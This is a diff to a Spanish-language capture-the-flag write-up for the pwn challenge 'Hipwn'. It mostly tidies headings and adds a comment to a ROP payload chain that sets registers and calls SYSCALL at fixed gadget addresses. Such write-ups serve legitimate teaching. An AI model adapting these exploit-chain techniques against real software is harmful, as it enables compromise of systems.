@@ -1,13 +1,9 @@
-#Hipwn
+# Hipwn
 
 ### Categoría: Pwn
 
-### Solucionado: No
-
 --------------------------
 
-
-#### Preparación
 
 Primero descargamos el plugin de Gdb para tener Gdb-peda:
 
@@ -214,7 +210,7 @@ payload += p64(0)        <== Lo que meteremos en R15, cualquier basura
 
 payload += p64(0x4023f5) <== La dirección de POP RDX; RET
 
-payload += p64(0)
+payload += p64(0)        <== Lo que meteremos en RDX
 
 
 payload += p64(0x4024dd) <== La dirección de SYSCALL; RET
